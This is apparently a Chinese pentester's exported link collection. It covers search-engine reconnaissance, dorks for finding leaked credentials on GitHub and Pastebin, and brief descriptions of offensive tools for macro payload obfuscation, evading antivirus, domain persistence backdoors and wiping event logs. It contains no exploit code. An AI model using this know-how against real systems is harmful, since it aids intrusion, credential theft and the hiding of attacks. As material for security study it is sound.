SQLMAP进阶使用 - MayIKissYou一段没有任何改动的代码，放在互联网上，也可能因为各种通用组件没有及时更新而变得脆弱。而搜索引擎则可以帮助我们更快的找到主机安全Shodan，撒旦 Shodan是一个用于帮助发现主要的互联网系统漏洞（包括路由器，交换机，工控系统等）的搜索引擎。它在圈子里就像google一样出名。它主要拦截从服务器到客户端的元数据来工作，目前提供超过50个端口的相关搜索。Shodan搜索引擎介绍 - 修码的马修ZoomeyeZoomEye(钟馗之眼)是知道创宇推出的一款网络空间搜索引擎，和撒旦的用法类似修码的马修ZoomeyeZoomEye(钟馗之眼)是知道创宇推出的一款网络空间搜索引擎，和撒旦的用法类似https://www.zoomeye.org/help/manual信息泄漏GithubGitHub是全球最大的社交编程及代码托管网站。用户可以十分轻易地管理、存储、和搜索程序代码，其因此受到了广大程序员们的喜欢。  上面泄漏的敏感信息不仅只有个人的邮箱、企业后台，通过渗透黑客很可能获取企业的核心业务源代码，应用的逻辑架构，数据库地址、账号密码，内部vpn信息，人事信息等所有内部敏感信息，所带来的危害比被攻破数道防火墙，被挖掘出数个web漏洞要大得多！邮箱账户smtp @http://xxx.comsmtp password后台地址admin password数据库信息Mysql root passwordsa password云服务的密钥aliyun_access_idApiKeyGoogle        hackSite:http://baidu.com学习案例新浪某开发人员意识不足监控邮箱泄漏（github）搜狐某开发人员意识不足导致某官方微博帐号与邮箱权限泄漏（github）新浪某开发人员意识不足导致某官方微博帐号与邮箱权限泄漏（github）京东某开发人员意识不足泄漏一些敏感信息（github）唯品会某些开发人员意识不足泄漏敏感信息（github）盛大某开发人员意识不足泄漏内部邮箱帐号密码（github）迅雷某开发人员意识不足泄漏内部邮箱帐号密码（github）github-hacker之某短信运营商平台漏洞致上万用户信息泄漏其连锁反应不可想象|Pastebin Pastebin 与 github 不同，它不提供代码托管、版本控制等复杂的功能，只提供展示文本、代码最基本功能。所以经常被黑客用于披露或是存放数据，很多时候我们可以通过 pastebin 提前得到泄漏的数据。site:http://pastebin.com @http://163.comsite:http://pastebin.com @http://qq.comsite:http://pastebin.com appleid总之… 你能想到的，或多或少，应该都有，发挥你的想象力</div></span><br></div><br><hr><br><a name="1361"><br><br><div><span><div><a href="https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet#Do_not_limit_the_character_set_and_set_long_max_lengths_for_credentials" target="_blank" rel="noopener">https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet#Do_not_limit_the_character_set_and_set_long_max_lengths_for_credentials</a></div><div><br></div><div><br></div><div><br></div></span><br></div><br><hr><br><a name="1362"><br><br><div><span><div><a href="https://github.com/0xbadjuju/Tokenvator" target="_blank" rel="noopener">https://github.com/0xbadjuju/Tokenvator</a></div></span><br></div><br><hr><br><a name="1365"><br><br><div><span><div><a href="https://github.com/ssl/ezXSS" target="_blank" rel="noopener">https://github.com/ssl/ezXSS</a></div></span><br></div><br><hr><br><a name="1366"><br><br><div><span><div>Linux提权攻击:<a href="https://n0where.net/linux-privilege-escalation-roothelper" target="_blank" rel="noopener">https://n0where.net/linux-privilege-escalation-roothelper</a></div></span><br></div><br><hr><br><a name="1367"><br><br><div><span><div><a href="https://secapps.com/appbandit" target="_blank" rel="noopener">https://secapps.com/appbandit</a></div></span><br></div><br><hr><br><a name="1388"><br><br><div><span><div><a href="https://github.com/hardenedlinux/linux-exploit-development-tutorial/blob/master/README.md" target="_blank" rel="noopener">https://github.com/hardenedlinux/linux-exploit-development-tutorial/blob/master/README.md</a></div></span><br></div><br><hr><br><a name="1389"><br><br><div><span><div><a href="https://github.com/DanMcInerney/icebreaker/blob/master/README.md" target="_blank" rel="noopener">https://github.com/DanMcInerney/icebreaker/blob/master/README.md</a></div></span><br></div><br><hr><br><a name="1390"><br><br><div><span><div><a href="http://www.offensiveops.io/tools/cobalt-strike-bypassing-windows-defender-with-obfuscation/" target="_blank" rel="noopener">http://www.offensiveops.io/tools/cobalt-strike-bypassing-windows-defender-with-obfuscation/</a></div></span><br></div><br><hr><br><a name="1391"><br><br><div><span><div><a href="https://t.co/vXPrr33S7B" target="_blank" rel="noopener">https://t.co/vXPrr33S7B</a></div><div>Ubuntu 16.04.4 kernel priv esc</div></span><br></div><br><hr><br><a name="1463"><br><br><div><span><div><br></div><div><div style="box-sizing: border-box; margin-top: 24px; margin-bottom: 16px; padding-bottom: 0.3em; border-bottom: 1px solid rgb(234, 236, 239); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><div><a href="https://github.com/sevagas/macro_pack/blob/master/README.md" target="_blank" rel="noopener">https://github.com/sevagas/macro_pack/blob/master/README.md</a></div><div><span style="color: rgb(36, 41, 46);"><span style="font-size: 24px;"><span style="font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;;"><span style="font-weight: 600;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">简短的介绍</font></font></span></span></span></span></div></div><p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">macro_pack是一个工具，用于自动化混淆和复制格式的生成，如MS Office文档或VBS格式。</font><font style="box-sizing: border-box; vertical-align: inherit;">现在它也处理各种快捷方式格式。</font></font><br clear="none" style="box-sizing: border-box;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">此工具可用于重新命名，pentests，演示和社会工程评估。</font><font style="box-sizing: border-box; vertical-align: inherit;">macro_pack将简化反恶意软件解决方案，绕过并自动化从vba生成到最终Office文档生成的过程。</font></font><br clear="none" style="box-sizing: border-box;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">使用非常简单：</font></font></p><ul style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; padding-left: 2em; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><li style="box-sizing: border-box;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">没有配置</font></font></li><li style="box-sizing: border-box; margin-top: 0.25em;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">一切都可以使用一行代码来完成</font></font></li><li style="box-sizing: border-box; margin-top: 0.25em;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">生成大部分Office格式和基于VBS的格式</font></font></li><li style="box-sizing: border-box; margin-top: 0.25em;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">高级VBA宏攻击以及DDE攻击</font></font></li></ul><p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">该工具与流行的pentest工具（Metasploit，Empire，…）生成的有效载荷兼容。</font><font style="box-sizing: border-box; vertical-align: inherit;">与其他工具结合也很容易，因为它可以从stdin读取输入并将输出安静地输出到另一个工具。</font><font style="box-sizing: border-box; vertical-align: inherit;">这个工具是用Python3编写的，可以在Linux和Windows平台上运行。</font></font></p><p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><strong style="box-sizing: border-box; font-weight: 600;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">注意：</font></font></strong><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;"> Office文档自动生成或特洛伊木马功能需要安装安装了正确MS Office应用程序的Windows平台。</font></font></p></div></span><br></div><br><hr><br><a name="1464"><br><br><div><span><div><a href="https://github.com/BeetleChunks/redsails/blob/master/README.md" shape="rect" target="_blank" rel="noopener">https://github.com/BeetleChunks/redsails/blob/master/README.md</a></div><div><h1 style="box-sizing: border-box; margin-top: 0px !important; margin-bottom: 16px; font-weight: 600; padding-bottom: 0.3em; font-size: 2em; border-bottom: 1px solid rgb(234, 236, 239); color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Redsails</font></font></h1><h2 style="box-sizing: border-box; margin-top: 24px; margin-bottom: 16px; font-weight: 600; padding-bottom: 0.3em; font-size: 1.5em; border-bottom: 1px solid rgb(234, 236, 239); color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><a href="https://github.com/BeetleChunks/redsails/blob/master/README.md#about" shape="rect" style="box-sizing: border-box; color: rgb(3, 102, 214); text-decoration: none; float: left; padding-right: 4px; margin-left: -20px;" target="_blank" rel="noopener"></a><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">关于</font></font></h2><p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">后期开发工具能够：</font></font></p><ul style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; padding-left: 2em; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><li style="box-sizing: border-box;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">在受损机器上保持持久性</font></font></li><li style="box-sizing: border-box; margin-top: 0.25em;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">破坏许多常见的主机事件日志（包括网络和帐户登录）</font></font></li><li style="box-sizing: border-box; margin-top: 0.25em;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">生成虚假日志/网络流量</font></font></li></ul><p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">基于[PyDivert]（</font></font><a href="https://github.com/ffalcinelli/pydivert" shape="rect" style="box-sizing: border-box; color: rgb(3, 102, 214); text-decoration: none;" target="_blank" rel="noopener"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">https://github.com/ffalcinelli/pydivert</font></font></a><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">），一种</font></font><a href="https://www.reqrypt.org/windivert.html" rel="noopener" shape="rect" style="box-sizing: border-box; color: rgb(3, 102, 214); text-decoration: none;" target="_blank"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">WinDivert</font></font></a><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">的Python绑定</font><font style="box-sizing: border-box; vertical-align: inherit;">，Windows驱动程序允许用户模式应用程序捕获/修改/丢弃发送到/从Windows网络堆栈发送的网络数据包。</font></font></p><p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">适用于比Vista和Windows 2008（包括Windows 7，Windows 8和Windows 10）更新的Windows操作系统。</font></font></p></div></span><br></div><br><hr><br><a name="1467"><br><br><div><span><div><a href="https://subt0x11.blogspot.co.uk/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1" target="_blank" rel="noopener">https://subt0x11.blogspot.co.uk/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1</a></div></span><br></div><br><hr><br><a name="1519"><br><br><div><br><span><div>https://0day.today</div></span><br></div><br><hr><br><a name="1520"><br><br><div><span><div><a href="http://mp.weixin.qq.com/s/eaYpGBAGXWbvOW0JWcTL4w" target="_blank" rel="noopener">http://mp.weixin.qq.com/s/eaYpGBAGXWbvOW0JWcTL4w</a></div></span><br></div><br><hr><br><a name="1521"><br><br><div><span><div><a href="https://sid-500.com/2018/04/02/powershell-how-to-get-a-list-of-all-installed-software-on-remote-computers/" target="_blank" rel="noopener">https://sid-500.com/2018/04/02/powershell-how-to-get-a-list-of-all-installed-software-on-remote-computers/</a></div></span><br></div><br><hr><br><a name="1539"><br><br><div><br><span><div><a href="https://github.com/tunz/js-vuln-db" target="_blank" rel="noopener">https://github.com/tunz/js-vuln-db</a></div></span><br></div><br><hr><br><a name="1593"><br><br><div><span><div>exp&quot;😢<a href="https://github.com/preempt/credssp" target="_blank" rel="noopener">https://github.com/preempt/credssp</a>&quot;</div></span><br></div><br><hr><br><a name="1594"><br><br><div><span><div><a href="https://github.com/HarmJ0y/DAMP" target="_blank" rel="noopener">https://github.com/HarmJ0y/DAMP</a></div><div>利用视频:<a href="https://www.youtube.com/watch?v=-ZMCjxCl_CE" target="_blank" rel="noopener">https://www.youtube.com/watch?v=-ZMCjxCl_CE</a></div><div><br></div><div><br></div><div>描述:昨天那个工具DAMP 是用于域权限维持的后门，是利用域策略的逻辑漏洞， 用域管的权限添加注册表把一个当前普通域用户的key添加到目标服务器，然后可以随时远程访问目标服务器，</div></span><br></div><br><hr><br><a name="1602"><br><br><div><span><div><br></div><div>https://xz.aliyun.com/t/2128</div></span><br></div><br><hr><br><a name="1603"><br><br><div><span><div><br></div><div>https://xz.aliyun.com/t/2144</div></span><br></div><br><hr><br><a name="1606"><br><br><div><span><div><a href="https://github.com/1N3/Sn1per/blob/master/README.md" target="_blank" rel="noopener">https://github.com/1N3/Sn1per/blob/master/README.md</a></div><div>值得使用</div></span><br></div><br><hr><br><a name="1609"><br><br><div><span><div><a href="https://github.com/WhaleShark-Team/cobra" target="_blank" rel="noopener">https://github.com/WhaleShark-Team/cobra</a></div></span><br></div><br><hr><br><a name="1646"><br><br><div><br><span><div><h1 style="box-sizing: border-box; font-size: 2em; margin-top: 0px !important; margin-right: 0px; margin-bottom: 16px; margin-left: 0px; font-weight: bold; line-height: 1.25; padding-bottom: 0.3em; border-bottom: 1px solid rgb(234, 236, 239); color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; font-size: 2em; font-weight: bold; line-height: 1.25; border-bottom: 1px solid rgb(234, 236, 239); color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><a href="https://github.com/enkomio/RunDotNetDll" style="font-weight: bold; font-size: 39pt; color: rgb(36, 41, 46);" target="_blank" rel="noopener">https://github.com/enkomio/RunDotNetDll</a><br></span></h1><h1 style="box-sizing: border-box; font-size: 2em; margin-top: 0px !important; margin-right: 0px; margin-bottom: 16px; margin-left: 0px; font-weight: bold; line-height: 1.25; padding-bottom: 0.3em; border-bottom: 1px solid rgb(234, 236, 239); color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; font-size: 2em; font-weight: bold; line-height: 1.25; border-bottom: 1px solid rgb(234, 236, 239); color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;">序集的所有方法并调用它们。</span></h1><div style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-style: italic;">RunDotNetDll</span><span style="box-sizing: border-box; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;">允许内省给定的.NET程序集，以列出在程序集中实现的所有方法并调用它们。</span><span style="box-sizing: border-box; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;">所有这一切都是通过纯粹的反思完成</span></div><div style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;">我创建了这个实用程序，以便轻松分析在运行时加载其他.NET程序集的恶意.NET程序。</span><span style="box-sizing: border-box; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;">一旦你已经解压缩程序集，你需要一个意思来运行它，但如果它是一个DLL是不是那么容易。</span></div><div><span style="box-sizing: border-box; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;">使用RunDotNetDll，您可以调用给定Assembly的特定方法。</span></div><div><img src="Demon分享_files/test_run.gif" type="image/gif" data-filename="test_run.gif" style="font-size: 12pt; color: rgb(36, 41, 46);"></div><div><br></div></div></span><br></div><br><hr><br><a name="1650"><br><br><div><br><span><div><span style="color: rgb(51, 51, 51); font-family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: 17px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: 0.544px; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><a href="http://hyp3rlinx.altervista.org/" target="_blank" rel="noopener">http://hyp3rlinx.altervista.org/</a></span></div></span><br></div><br><hr><br><a name="1652"><br><br><div><br><span><div><span style="color: rgb(51, 51, 51); font-family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: 17px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: 0.544px; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><a href="https://github.com/Ice3man543/hawkeye" target="_blank" rel="noopener">https://github.com/Ice3man543/hawkeye</a></span></div></span><br></div><br><hr><br><a name="1664"><br><br><div><span><div><a href="https://github.com/txthinking/brook/blob/master/README.md#what-is-brook" target="_blank" rel="noopener">https://github.com/txthinking/brook/blob/master/README.md#what-is-brook</a></div></span><br></div><br><hr><br><a name="1665"><br><br><div><span><div><a href="https://github.com/jacobsoo/IoT-MalwareTracker" target="_blank" rel="noopener">https://github.com/jacobsoo/IoT-MalwareTracker</a></div></span><br></div><br><hr><br><a name="1667"><br><br><div><br><span><div><a href="https://github.com/ExpLife0011/awesome-windows-kernel-security-development" target="_blank" rel="noopener">https://github.com/ExpLife0011/awesome-windows-kernel-security-development</a></div><div><br></div><div><img src="Demon分享_files/Image.png" type="image/png" data-filename="Image.png"></div><div><br></div></span><br></div><br><hr><br><a name="1671"><br><br><div><br><span><div><a href="https://github.com/vulnersCom/nmap-vulners" target="_blank" rel="noopener">https://github.com/vulnersCom/nmap-vulners</a></div><div><br></div><div><img src="Demon分享_files/Image [1].png" type="image/png" data-filename="Image.png"></div><div><br></div><div>命令： <span style="box-sizing: border-box; font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; word-wrap: normal; overflow: visible; line-height: 1.45; background-color: rgb(246, 248, 250); border-radius: 3px; color: rgb(36, 41, 46); font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background: transparent; word-break: normal; white-space: pre; border: 0px;">nmap -sV –script vulners IP</span></div><div><br></div></span><br></div><br><hr><br><a name="1739"><br><br><div><br><span><div><a href="https://github.com/360-A-Team/EventCleaner" target="_blank" 